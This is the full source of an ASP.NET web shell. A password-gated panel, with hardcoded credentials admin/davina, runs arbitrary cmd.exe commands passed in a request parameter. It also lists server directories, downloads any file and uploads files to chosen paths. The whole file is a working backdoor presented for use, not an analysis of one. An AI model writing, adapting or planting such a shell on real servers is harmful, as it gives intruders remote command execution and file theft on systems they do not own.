<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Web.SessionState" %>
<%@ Import Namespace="System.Web" %>
<%
    // ================= LOGIN AUTH ===================
    string username = "admin";
    string password = "davina";
    if (Session["auth"] == null || (string)Session["auth"] != "ok")
    {
        if (Request.HttpMethod == "POST" && Request["u"] == username && Request["p"] == password)
        {
            Session["auth"] = "ok";
            Response.Redirect(Request.RawUrl);
        }
        else
        {
%>
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body { background: #111; color: #0f0; font-family: monospace; text-align: center; padding-top: 10%; }
        input { background: #222; border: 1px solid #0f0; color: #0f0; padding: 5px; }
    </style>
</head>
<body>
    <h2>🔐 Secure Shell Login</h2>
    <form method="post">
        Username: <input name="u"><br><br>
        Password: <input name="p" type="password"><br><br>
        <input type="submit" value="Enter">
    </form>
</body>
</html>
<%
            Response.End();
        }
    }

    // ================= MAIN SHELL ===================
    string cmd = Request["cmd"];
    string path = Request["path"];
    string download = Request["download"];
    string currentDir = string.IsNullOrEmpty(path) ? Server.MapPath(".") : path;
    Directory.SetCurrentDirectory(currentDir);
    string output = "";

    // FILE DOWNLOAD
    if (!string.IsNullOrEmpty(download))
    {
        string filePath = Path.Combine(currentDir, download);
        if (File.Exists(filePath))
        {
            Response.ContentType = "application/octet-stream";
            Response.AppendHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(filePath));
            Response.TransmitFile(filePath);
            Response.End();
        }
    }

    // COMMAND EXECUTION
    if (!string.IsNullOrEmpty(cmd))
    {
        try
        {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
            p.WaitForExit();
        }
        catch (Exception ex)
        {
            output = ex.ToString();
        }
    }

    // FILE UPLOAD
    if (Request.HttpMethod == "POST" && Request.Files.Count > 0)
    {
        try
        {
            HttpPostedFile file = Request.Files[0];
            string savePath = Path.Combine(currentDir, Path.GetFileName(file.FileName));
            file.SaveAs(savePath);
            output = "✅ Uploaded: " + savePath;
        }
        catch (Exception ex)
        {
            output = "❌ Upload error: " + ex.ToString();
        }
    }
%>
<!DOCTYPE html>
<html>
<head>
    <title>ASPX Shell Panel</title>
    <style>
        body { background: #111; color: #eee; font-family: monospace; padding: 20px; }
        input[type=text], input[type=file] { width: 80%; padding: 5px; background: #222; color: #0f0; border: 1px solid #555; }
        input[type=submit] { padding: 5px 10px; background: #333; color: #0f0; border: 1px solid #0f0; cursor: pointer; }
        pre { background: #000; color: #0f0; padding: 10px; border: 1px solid #0f0; overflow-x: auto; }
        a { color: #0ff; text-decoration: none; }
        hr { border: 1px solid #333; }
    </style>
</head>
<body>
    <h2>💀 ASPX Web Shell (Secure)</h2>

    <form method="get">
        <label>📂 Directory Path:</label><br>
        <input type="text" name="path" value="<%= currentDir %>">
        <input type="submit" value="Go">
    </form>

    <hr>
    <h3>📁 Directory Listing</h3>
    <b>Folders:</b><br>
    <% foreach (string d in Directory.GetDirectories(currentDir)) { %>
        <a href="?path=<%= d %>"><%= d %></a><br>
    <% } %>
    <br>
    <b>Files (click to download):</b><br>
    <% foreach (string f in Directory.GetFiles(currentDir)) {
        string filename = Path.GetFileName(f);
    %>
        <a href="?path=<%= currentDir %>&download=<%= filename %>"><%= filename %></a><br>
    <% } %>

    <hr>
    <h3>⚙️ Command Execution</h3>
    <form method="get">
        <input type="hidden" name="path" value="<%= currentDir %>">
        <input type="text" name="cmd" placeholder="e.g. whoami" />
        <input type="submit" value="Run" />
    </form>
    <% if (!string.IsNullOrEmpty(cmd)) { %>
        <pre><%= Server.HtmlEncode(output) %></pre>
    <% } %>

    <hr>
    <h3>📤 File Upload</h3>
    <form method="post" enctype="multipart/form-data">
        <input type="hidden" name="path" value="<%= currentDir %>">
        <input type="file" name="file" />
        <input type="submit" value="Upload" />
    </form>
    <% if (Request.HttpMethod == "POST") { %>
        <pre><%= Server.HtmlEncode(output) %></pre>
    <% } %>
</body>
</html>
